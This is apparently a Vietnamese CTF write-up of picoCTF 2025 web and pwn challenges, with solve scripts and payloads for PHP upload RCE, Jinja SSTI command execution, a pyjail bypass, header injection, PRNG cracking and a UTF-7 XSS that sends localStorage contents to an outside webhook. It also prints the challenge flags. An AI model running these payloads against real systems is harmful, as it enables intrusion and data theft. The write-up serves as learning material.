---
title: "picoCTF 2025"
description: "picoCTF 2025"
summary: "picoCTF 2025 writeup"
categories: ["Writeup"]
tags: ["Web", "Pwn"]
#externalUrl: ""
date: 2025-03-23
draft: false
cover: ../../post/picoctf/feature.jpg
authors:
  - winky
---




Giải picoCTF vừa rồi team mình đã hardcore và giải được gần hết trừ 3 bài siêu khó vip pro. Sau đây là writeup các bài mà mình làm được trong giải và 1 bài mình làm lại sau giải.

![image](https://hackmd.io/_uploads/BkcgoK5hkl.png)

## pwn/PIE TIME

![image](https://hackmd.io/_uploads/ryqH_qq2kl.png)

### Hints

No hint 

### Solution

Đây là source của file 

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

Thì cơ bản là chương trình cho ta địa chỉ hàm main và yêu cầu ta tìm địa chỉ hàm win để nhảy vào. Ở đây mình check địa chỉ hàm main là 0x133d và hàm win là 0x12a7 

![image](https://hackmd.io/_uploads/Hy3Yt9c21e.png)

Từ đó mình tính được khoảng cách hai hàm như sau 0x133d - 0x12a7 = 0x96. Vậy lúc này chỉ cần trừ địa chỉ hàm main được cho với 0x96 là xong 

![image](https://hackmd.io/_uploads/rJM7o55hkg.png)

Từ đó mình xây dựng solve script sau 

```python
from pwn import *
p = remote("rescued-float.picoctf.net", 57078)

out = p.recvline().decode()
main = int(out.split("0x")[1], 16)
win = main - 0x96

print(f"win() address: {hex(win)}")
p.sendline(hex(win))
print(p.recvall().decode())
```

![image](https://hackmd.io/_uploads/B1xknc9nJg.png)

`Flag: picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_80c3b8b7}
`

## web/Cookie Monster Secret Recipe

![image](https://hackmd.io/_uploads/rkec6PKj1l.png)

### Hints

Cookie

### Solution

Challenge cho mình một trang web như sau yêu cầu đăng nhập

![image](https://hackmd.io/_uploads/BJh3awKj1l.png)

Sau khi đăng nhập thì hiện trang sau

![image](https://hackmd.io/_uploads/SyFaTDYoJx.png)

Vì bài này đề cập đến cookie nên mình mở devtool và thấy một đoạn base64 

![image](https://hackmd.io/_uploads/ryEeCvKs1e.png)

Thử decode và mình có flag

![image](https://hackmd.io/_uploads/rkOM0Ptsyl.png)

`Flag: picoCTF{c00k1e_m0nster_l0ves_c00kies_E634DFBB} `

## web/head-dump

![image](https://hackmd.io/_uploads/ryQ_1_YoJe.png)

### Hints

No hint

### Solution

Chall cho mình một trang web

![image](https://hackmd.io/_uploads/SyBT1OFiye.png)

Thấy không có gì khả nghi cả nên mình thử dirsearch xem có gì hot

![image](https://hackmd.io/_uploads/rJBhguKiJe.png)

Hmmm có một endpoint /headdump trông khá sú khi vào thì web download xuống một file

![image](https://hackmd.io/_uploads/ryBZ-_FiJe.png)

mở lên và có luôn flag

![image](https://hackmd.io/_uploads/HJegZuti1g.png)

`Flag: picoCTF{Pat!3nt_15_Th3_K3y_f1179e46}`

## web/n0s4n1ty 1

![image](https://hackmd.io/_uploads/BJJK-_KsJx.png)

### Hints

File upload vulnerability

### Solution

Challenge cho mình một trang web về profile 

![image](https://hackmd.io/_uploads/BJFsZOKiJl.png)

Vì web cho upload cả file php nên mình thử payload sau

```<?php echo 123;?>```

Và đoạn code được thực thi

![image](https://hackmd.io/_uploads/BJbvfdKoyl.png)

Mình thử `ls` nhưng không có file gì lạ nên thử `ls /` và thấy có `/challenge` khá sú

```<?php system("ls -lah /");?>```

![image](https://hackmd.io/_uploads/HJe7XOKjyx.png)

Thử ls thư mục này và có 2 file 

```<?php system("sudo ls /challenge")?>```

Đọc thử file metadata và có flag

```<?php system("sudo cat /challenge/metadata.json")?>```

![image](https://hackmd.io/_uploads/rkHMEuYsyg.png)

`Flag: picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}`

## web/SSTI1

![image](https://hackmd.io/_uploads/HJmiE_FiJl.png)

### Hints

SSTI

### Solution

Okay thì đây là một bài SSTI cơ bản

![image](https://hackmd.io/_uploads/B1ea4uKjye.png)

Mình tìm payload trên đây https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md 

![image](https://hackmd.io/_uploads/HJRdU_Fiye.png)

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

Sử dụng và mình đã thành công RCE

![image](https://hackmd.io/_uploads/HklTi8OKsJe.png)

thử list các file

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```

![image](https://hackmd.io/_uploads/rkg0UdFoyx.png)

Thấy có file flag và chỉ cần đọc thôi 

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

![image](https://hackmd.io/_uploads/ryhyw_KiJl.png)

`Flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}`

## web/SSTI2

![image](https://hackmd.io/_uploads/B1VS8utjke.png)

### Hints

SSTI

### Solution

Bài này giống bài trước nhưng có filter dấu `_`

![image](https://hackmd.io/_uploads/SJvkIOFiyl.png)

Okey thì payload trước đã có thể bypass rồi nên mình xài lại thôi 

![image](https://hackmd.io/_uploads/ryMEUOtiyx.png)

`Flag: picoCTF{sst1_f1lt3r_byp4ss_e3f3b57a}`

## web/3v@l

![image](https://hackmd.io/_uploads/rybAP_Fs1e.png)

### Hints

Pyjail

### Solution

Challenge cho mình một trang web để tính toán 

![image](https://hackmd.io/_uploads/SkMMOdKj1l.png)

Ở đây web cấm gần hết các chữ dùng để eval lệnh python rồi 

![image](https://hackmd.io/_uploads/S1-BOuto1x.png)

```html
<!--
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->
```

Nhưng có một lệnh mà web không cấm đó là open ở đây để bypass regex thì mình có thể sử dụng chr 

```python
open(chr(47)+"flag"+chr(46)+"txt")
```

Ok và mình đã thực hiện eval thành công nhưng chỉ in ra được object của open thôi 

![image](https://hackmd.io/_uploads/SyOxYOYsyl.png)

Để in ra giá trị thì mình có thể trigger một cái error bằng cách ép kiểu int cho flag và vì flag chỉ là một string nên nó sẽ lỗi

```python
int(*open(chr(47)+"flag"+chr(46)+"txt"))
```

Và từ đó mình có flag 

![image](https://hackmd.io/_uploads/HJoNFOYoyx.png)

`Flag: picoCTF{D0nt_Use_Unsecure_f@nctions6798a2d8}`

## web/WebSockFish

![image](https://hackmd.io/_uploads/BJy7j0521g.png)

### Hints

Websocket

### Solution

Challenge cho mình một trang web đánh cờ 

![image](https://hackmd.io/_uploads/rJRoI553kg.png)

Sau khi đánh được một bước thì mình thấy web sử dụng websocket để giao tiếp 

![image](https://hackmd.io/_uploads/BymRUc92kx.png)

Mình thử buff lên và có luôn flag ... 

![image](https://hackmd.io/_uploads/SkXZwqc3yx.png)

`Flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_0d3d41e1}`

## web/Apriti sesamo

![image](https://hackmd.io/_uploads/SJTaKOFikg.png)

### Hints

Type Juggling 

### Solution

Challenge cho mình một web như sau 

![image](https://hackmd.io/_uploads/r1V8cdYj1x.png)

![image](https://hackmd.io/_uploads/S1aU5uFjyl.png)

Sử dụng ~ để xem backup của file và mình thấy có một đoạn php đã được obfuscate 

![image](https://hackmd.io/_uploads/ByJdcuYokx.png)

```php
<!--?php
if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}?-->
```

Thử deobfuscate đoạn code trên và thấy rằng web sẽ lấy 2 biên username và pwd để so sánh, trong đó điều kiện là 2 biến khác nhau nhưng hash sha1 giống nhau. 

```php!
<!--?php
if(isset($_POST["username"])&& isset($_POST["pwd"])){$yuf85e0677=$_POST["username"];$rs35c246d5=$_POST["pwd"];if($yuf85e0677==$rs35c246d5){echo <br/>Failed! No flag for you;}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents('../flag.txt');}else{echo <br/>Failed! No flag for you;}}}?-->
```

Dạng này mình từng làm rồi, ở đây chỉ cần truyền vào 2 array để sha1 trả ra null và sẽ giống nhau từ đó mình có flag 

![image](https://hackmd.io/_uploads/BJ2hcutj1e.png)

```picoCTF{w3Ll_d3sErV3d_Ch4mp_233d4a80}```

## web/Pachinko

![image](https://hackmd.io/_uploads/Syzj5R93kx.png)

### Hints

No hint 

### Solution

Bài này có 2 flag một là random nên mình bấm vào cái ra flag luôn, hai là về pwn và wasm nên mình thua

<!-- ![image](https://hackmd.io/_uploads/ryyoKOtjJx.png) -->

![image](https://hackmd.io/_uploads/ryq_GoU2yx.png)


## web/secure-email-service

![image](https://hackmd.io/_uploads/Byig4y1T1g.png)

### Hints

XSS, Cracking

### Solution

Đầu tiên mình cần để ý đến 2 file này 

<details>
<summary>main.py</summary>
    
```python
from typing import Annotated
from fastapi import Body, Depends, FastAPI, HTTPException, status
from fastapi.staticfiles import StaticFiles
from jinja2 import Template
from model import *

import asyncio
import db
import util
import uuid
import uvicorn
import sys
import os

app = FastAPI()

template = Template(open('./template.jinja2', 'r').read(), autoescape=True)
browser = asyncio.Lock()

@app.post('/api/login')
async def login(
	username: Annotated[str, Body()],
	password: Annotated[str, Body()]
) -> str:
	user = await db.get_user(username)
	if password != user.password:
		raise HTTPException(
			status_code=status.HTTP_401_UNAUTHORIZED,
			detail='incorrect password'
		)
	return await db.make_token(user.username)

@app.get('/api/me')
async def ok(user: Annotated[User, Depends(db.request_user)]):
	return user.username

@app.get('/api/emails')
async def emails(
	user: Annotated[User, Depends(db.request_user)],
) -> dict[str, Email]:
	return await db.get_emails(user)

@app.get('/api/email/{email_id}')
async def email(
	user: Annotated[User, Depends(db.request_user)],
	email_id: str
):
	return await db.get_email(user, email_id)

@app.post('/api/mark_read/{email_id}')
async def mark_read(
	user: Annotated[User, Depends(db.request_user)], 
	email_id: str
) -> bool:
	return await db.mark_read(user, str(email_id))

@app.post('/api/send')
async def send(
	user: Annotated[User, Depends(db.request_user)],
	to: Annotated[str, Body()],
	subject: Annotated[str, Body()],
	body: Annotated[str, Body()]
):
	# make sure the email we're sending to is valid
	recipient = await db.get_user(to)

	if len(user.public_key) == 0:
		msg = util.generate_email(
			sender=user.username,
			recipient=recipient.username,
			subject=subject,
			content=body,
		)
	else:
		msg = util.generate_email(
			sender=user.username,
			recipient=recipient.username,
			subject=subject,
			content=template.render(
				title=subject,
				content=body
			),
			html=True,
			sign=True,
			cert=user.public_key,
			key=user.private_key
		)

	email_id = str(uuid.uuid4())
	await db.send_email(recipient, email_id, msg)

	return email_id

@app.get('/api/root_cert')
async def root_cert():
	return await db.get_root_cert()

@app.post('/api/admin_bot')
async def admin_bot(_: Annotated[User, Depends(db.request_user)],):
	admin = await db.get_user('admin@ses')
	print("123")
	async with browser:
		async with asyncio.timeout(15):
			proc = await asyncio.create_subprocess_exec(sys.executable, 'admin_bot.py', env={
				'FLAG': os.environ.get('FLAG', 'picoCTF{flag}'),
				'PASSWORD': admin.password,
			})
			await proc.wait()

	return 'success'

@app.get('/api/password')
async def password():
	return await db.get_user_password()

app.mount('/', StaticFiles(directory='static', html=True), name='static')

uvicorn.run(app, port=8000, host='0.0.0.0')    
```
    
</details>

<details>
<summary>admin_bot.py</summary>
    
```python
from os import environ
from playwright.async_api import async_playwright, expect

import asyncio
import re

flag = environ.get('FLAG', 'picoCTF{flag}')
password = environ.get('PASSWORD', 'admin@ses')

async def bot():
	async with asyncio.timeout(12):
		async with async_playwright() as p:
			browser = await p.chromium.launch()
			page = await browser.new_page()
			await page.goto('http://127.0.0.1:8000')

			await page.evaluate('flag => localStorage.setItem("flag", flag)', flag)
			
			# login
			await page.type('[name=username]', 'admin@ses')
			await page.type('[name=password]', password)
			await page.click('button')

			# click on first email
			await page.wait_for_url('http://127.0.0.1:8000/inbox.html', wait_until='networkidle')
			try:
				await page.click('tbody tr', timeout=1000)
			except:
				await browser.close()
				return

			# click reply button
			await page.wait_for_url('http://127.0.0.1:8000/email.html?id=*', wait_until='networkidle')
			await expect(page.locator('#reply')).to_have_attribute('href', re.compile('.*'))
			await page.click('#reply button')

			# reply to email
			await page.wait_for_url('http://127.0.0.1:8000/reply.html?id=*', wait_until='networkidle')
			await page.type('textarea', '\n\n'.join([
				'We\'ve gotten your message and will respond soon.',
				'Thank you for choosing SES!',
				'Best regards,',
				'The Secure Email Service Team'
			]))
			await page.click('#reply button')
			await browser.close()

asyncio.run(bot())
```
    
</details>

#### Overview

Ok thì challenge cho mình một trang web sau, mục tiêu của ta là lấy flag ở localStorage của admin_bot

![image](https://hackmd.io/_uploads/SJf49BA2yx.png)

Theo như hướng dẫn thì ta có thể lấy mật khẩu của `user@ses` tại `/api/password` 

![image](https://hackmd.io/_uploads/B1OB9r0nyl.png)

Log in vào và mình có một trang web gửi mail như sau 

![image](https://hackmd.io/_uploads/BkYwqB031g.png)

Ok thì mình có một mail của admin gửi và khi mở lên thì mình nhận ra đây là phần jinja có trong source nên mình nghĩ là mình có thể gửi html và trigger XSS 

![image](https://hackmd.io/_uploads/SJwq5B0hJl.png)

Nhưng không, các mail khi được gửi đã bị parse và ta không thể truyền vào như thông thường.

![image](https://hackmd.io/_uploads/Bkg9a9B031e.png)

Nhưng tại sao phần email của admin lại hiện như một html ? Ở đây khi ta quan sát kỹ email thì nó sẽ có một header Content-Type như sau 

![image](https://hackmd.io/_uploads/HyR7orC2Jx.png)

Ok nói rõ hơn thì format của một email sẽ trông giống một HTTP request và có sử dụng Content-Type và charset. Trong đây thì các mail được phân bởi một boundary.

```email
Content-Type: multipart/mixed; boundary="===============0171192972617867235=="
MIME-Version: 1.0
From: user@ses
To: admin@ses
Subject: Re: Welcome to Secure Email Service!

--===============0171192972617867235==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

<script>alert(1)</script>
--===============0171192972617867235==--
```

Sở dĩ mail của admin có dạng html vì có Content-Type như sau. Từ đó ta sẽ tìm cách thêm vào một section trong email có Content-Type này để trigger biến content thành html và thực hiện lệnh js. 

![image](https://hackmd.io/_uploads/Hy8t3rCnJl.png)

Ở đây ta đọc kỹ đoạn send email

```python
if len(user.public_key) == 0:
    msg = util.generate_email(
        sender=user.username,
        recipient=recipient.username,
        subject=subject,
        content=body,
    )
else:
    msg = util.generate_email(
        sender=user.username,
        recipient=recipient.username,
        subject=subject,
        content=template.render(
            title=subject,
            content=body
        ),
        html=True,
        sign=True,
        cert=user.public_key,
        key=user.private_key
    )
```

Có thể thấy khi có cả public key và private key thì ta mới có thể thêm attribute html vào 

```python
def generate_email(
	sender: str,
	recipient: str,
	subject: str,
	content: str,
	html: bool = False,
	sign: bool = False,
	cert: str = '',
	key: str = '',
) -> str:
	msg = MIMEMultipart()
	msg['From'] = sender
	msg['To'] = recipient
	msg['Subject'] = subject
	msg.attach(MIMEText(content))

	if html:
		msg.attach(MIMEText(content, 'html'))		

	if sign:
		return smail.sign_message(msg, key.encode(), cert.encode()).as_string()

	return msg.as_string()
```

Và web chỉ cho mình public key thôi nên mình sẽ tìm cách khác để lấy private key từ admin 

#### Header injection

Xem lại format của mail ta có thể thấy phần subject ta có thể truyền tùy ý và nếu ta truyền một newline thì sao 

Giả sử như : 

```test\nFrom: test@ses```

sẽ trở thành

```
test
From: test@ses
```

và ta có thể thay đổi header From nhưng ...

![image](https://hackmd.io/_uploads/rylGfRSC2Jl.png)

Ok thì nó trả ra lỗi ở đây mình check thì hàm email khi parse đã phát hiện mình đã inject vào một header lạ.

![image](https://hackmd.io/_uploads/ByavCrC3ke.png)

Ok sau một hồi research thì mình phát hiện cơ chế nó ở đây https://github.com/python/cpython/blob/main/Lib/email/header.py#L384

Thì nó sẽ check subject của mình theo một regex sau có nghĩa là phát hiện xuống dòng theo sau là các char khác khoảng trắng và dấu hai chấm.

![image](https://hackmd.io/_uploads/rJPbJU0nkg.png)

Để bypass thì trước hai chấm mình sẽ thêm một khoảng trắng là được. Từ đó regex sẽ không tìm được pattern và ta sẽ bypass được.

![image](https://hackmd.io/_uploads/rJDGkI0nkx.png)

Tiến hành gửi lại và yeah nó đã bypass được

![image](https://hackmd.io/_uploads/SyZKyUR2kl.png)

Khi check thì mình thấy được admin đã nhận được email từ test@ses là phần From mà mình đã inject 

#### Crack 63bit-integers generated by random of Python 

Ở đây các section trong email được ngăn cách bởi boundary và nếu không có thì mail sẽ không detect đó là một section. Vì vậy mình đi tìm cơ chế để tạo ra boundary ở đây https://github.com/search?q=repo%3Apython%2Fcpython%20boundary%20Path%3Aemail%2F&type=code

Có thể thấy nó sẽ sử dụng hàm random. Ok thì mình sẽ tiến hành crack nó để tìm các thằng random tiếp theo 

```python
#   _make_boundary = Generator._make_boundary
# at the end of the module.  It *is* internal, so we could drop that...
@classmethod
def _make_boundary(cls, text=None):
    # Craft a random boundary.  If text is given, ensure that the chosen
    # boundary doesn't appear in the text.
    token = random.randrange(sys.maxsize)
```

Ban đầu thì mình định sử dụng randcrack https://github.com/tna0y/Python-random-module-cracker nhưng khi xem lại thì nó sử dụng random để gen ra 63 bit trong khi randcrack chỉ chấp nhận submit 32 bit 

![image](https://hackmd.io/_uploads/Bk9OeU0nJl.png)

Ở đây chúng ta có thể crack số 64 bit nhờ vào một tính chất như sau https://ctftime.org/writeup/14939#:~:text=getrandbits(64)%20you%20actually%20get%20getrandbits(32)%20%3C%3C%2032%20%7C%20getrandbits(32)

`getrandbits(64) = getrandbits(32) << 32 | getrandbits(32)` 

Ok thì mình mởi phát hiện khi random số bit lớn thì sẽ dựa vào random 32 bit https://github.com/python/cpython/blob/ef06508f8ef1d2943b2fb1e310ab115b65e489a8/Modules/_randommodule.c#L542C13-L542C27

Và ta có cơ chế sau `getrandbits(63) = getrandbits(31) << 32 | getrandbits(32)`

Ok thì mình tiến hành đi tìm tool để crack số có 31 bit và thấy có một tool dùng để crack với unknown bit https://github.com/icemonster/symbolic_mersenne_cracker. Từ đó mình xây dựng chương trình để crack random 63 bit như sau 

```python
import random
import requests
import re
from main import *
cracker = Untwister()

headers = {
    'Content-Type': 'application/json',
    'token': '62fe387ae674fdff008eb267ae72db2385a9080974221f1e415d31db3924c262',
}

json_data = {
    'to': 'user@ses',
    'subject': '123',
    'body': '456',
}

for i in range(1000):

	res = requests.post('http://127.0.0.1:8000/api/send', headers=headers, json=json_data, verify=False)
	res2 = requests.get(f'http://127.0.0.1:8000/api/email/{res.text.replace("\"", "")}', headers=headers, verify=False)
	data = res2.json()['data']
	boundary = int(re.findall(r"===(\d+)==",data)[0])
	b = bin(boundary)[2:].zfill(63)
	low = b[:31]
	high = b[31:]
	low = low + '?'
	cracker.submit(high)
	cracker.submit(low)

randcrack = cracker.get_random()
for _ in tqdm.trange(10):
	

	res = requests.post('http://127.0.0.1:8000/api/send', headers=headers, json=json_data, verify=False)
	res2 = requests.get(f'http://127.0.0.1:8000/api/email/{res.text.replace("\"", "")}', headers=headers, verify=False)
	data = res2.json()['data']
	
	real_boundary = int(re.findall(r"===(\d+)==",data)[0])
	crack_boundary = randcrack.getrandbits(63)
	
	print(real_boundary, crack_boundary)
```

Khi chạy thì mình có thể predict các số 63 bit tiếp theo của random và cũng là boundary của các email tiếp theo 

![image](https://hackmd.io/_uploads/rJAzrLChyx.png)

#### Using Base64 encoding to encode newline character

Ok chúng ta đã crack được boundary nhưng còn một vấn đề là về signature. Làm sao để tận dụng được boundary để sử dụng private key? Khi admin reply thì mình nhận ra nó sẽ lấy subject của tin nhắn trước như sau 

![image](https://hackmd.io/_uploads/BykrFKCnyl.png)

Từ đó mình có thể sử dụng boundary của email tiếp theo để khi reply admin sẽ tiến hành signature cái subject mà mình chèn vào từ email trước nhưng mà làm thế nào ?

ở đây sinh ra thêm môt vấn đề nữa là endline của mình sẽ bị thực thi trong email đầu chứ không phải email sau. nên mình tìm cách để chèn endline vào mà khi reply nó mới thực thi. Và mình có thể sử dụng base64 để encode lại như sau https://datatracker.ietf.org/doc/html/rfc2047#section-8:~:text=4.1.%20The%20%22B%22%20encoding%0A%0A%20%20%20The%20%22B%22%20encoding%20is%20identical%20to%20the%20%22BASE64%22%20encoding%20defined%20by%20RFC%0A%20%20%202045.

Ok thì mình có thê truyền một subject như sau

`=?ISO-8859-1?B?dGVzdDIKRnJvbSA6IHRlc3RAc2Vz==?=`

Và yeah endline đã được vào subject 

![image](https://hackmd.io/_uploads/H1A3LDC3yl.png)

Và khi mình reply nó sẽ lấy header From để gửi. Từ đây mình có luồng attack như sau : đăng nhập => crack boundary => lấy boundary của email tiếp theo => gửi payload đã được base64 và inject header From từ admin@ses => khi admin reply chính mình thì payload đã được parse ra và kèm với chữ ký => XSS 

![image](https://hackmd.io/_uploads/Skx0IvCnkg.png)

#### Bypass XSS by using charset utf-7 charset

Ok sau khi crack thì mình gửi một payload như sau để trigger alert 

```email
test

--==============={admin_boundary}==
Content-Type : text/html; charset=us-ascii
MIME-Version : 1.0

<img src=x onerror=alert(1) />
--==============={admin_boundary}==
```

Sau khi check thì dầu < và > của mình đã bị parse và mình không thể chèn 

![image](https://hackmd.io/_uploads/Bk8cRKRhkx.png)

Đến đây mình có thể tận dụng charset để bypass cụ thể mình sẽ sử dụng utf-7 khi đó dấu < và > sẽ được biến đổi thành +ADw và -+AD `https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&input=PGltZyBzcmM9IngiIG9uZXJyb3I9YWxlcnQoMSk7IC8%2B`

```email
test

--==============={admin_boundary}==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4-
--==============={admin_boundary}==
```

Ok payload đã được gửi nhưng vẫn không có gì xảy ra

![image](https://hackmd.io/_uploads/ByjZec031x.png)

 và mình phát hiện có một phần khá sú 

![image](https://hackmd.io/_uploads/H1NGlcRnke.png)

Số .0 này là một cơ chế để ngăn chặn việc thêm boundary một cách vô ý https://github.com/python/cpython/blob/main/Lib/email/generator.py#L384

Nhưng khi xem đến phần regex để tìm boundary này thì mình mới hiểu là nó sẽ tìm dấu -- ở đầu mỗi line và đó là boundary 

```python
cls._compile_re('^--' + re.escape(b) + '(--)?$', re.MULTILINE)
```

Nhưng nếu ta bypass bằng dấu cách ở đầu như thế này thì sao? 

```email
test

    --==============={admin_boundary}==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4-
    --==============={admin_boundary}==
```

And yeah regex sẽ không tìm được và mình đã XSS thành công 

![image](https://hackmd.io/_uploads/rk59g9AhJg.png)

#### Final attack 

Okay bước cuối cùng là wrap payload vào

Lúc đầu thì mình sử dụng payload sau để catch webhook

```html
<img src="x" onerror=fetch('https://webhook.site/1639fb06-1baf-48d4-868f-001ae363e147'+localStorage.getItem("flag")) />
```

```email
test

    --==============={admin_boundary}==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-fetch('webhook-url'+-localStorage.getItem(+ACI-flag+ACI-))+ACA-/+AD4-
    --==============={admin_boundary}==
```

And well, nó bị lỗi

![image](https://hackmd.io/_uploads/HkecmqChkl.png)

check log thì mình phát hiện là trong khi parse code đã detect được embedded header 

![image](https://hackmd.io/_uploads/H1wrvpRnJg.png)

Đó là do trong https:// đã vi phạm regex ở phần trên nên mình tiến hành bypass bằng cách bỏ đi https: 

```hmtl
<img src="x" onerror=fetch('//webhook.site/1639fb06-1baf-48d4-868f-001ae363e147/?'.concat(localStorage.getItem('flag'))) />
```

And yeah finally mình cũng lấy được localStorage 

![image](https://hackmd.io/_uploads/B1DAj6Ahyg.png)

Bây giờ chỉ cần gửi payload cho admin rồi trigger 2 lần một lần để reply chứa chữ ký, một lần để vào và dính XSS là xong 

![image](https://hackmd.io/_uploads/SJjv260h1l.png)

Cuối cùng ta có flag 

![image](https://hackmd.io/_uploads/SkXPn60nJl.png)


